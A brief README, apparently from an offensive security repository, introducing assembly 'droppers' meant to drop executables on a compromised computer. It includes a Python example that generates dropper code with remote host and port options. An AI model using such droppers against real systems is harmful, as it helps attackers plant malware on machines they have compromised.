# Droppers

Droppers written in assembly to drop executables on the compromised computer system.

```python3
from linux_x64_dropper import Dropper

dropper = Dropper()
code = dropper.generate(assemble=False, options={'RHOST': '127.0.0.1', 'RPORT': 8888})

print(code)
```
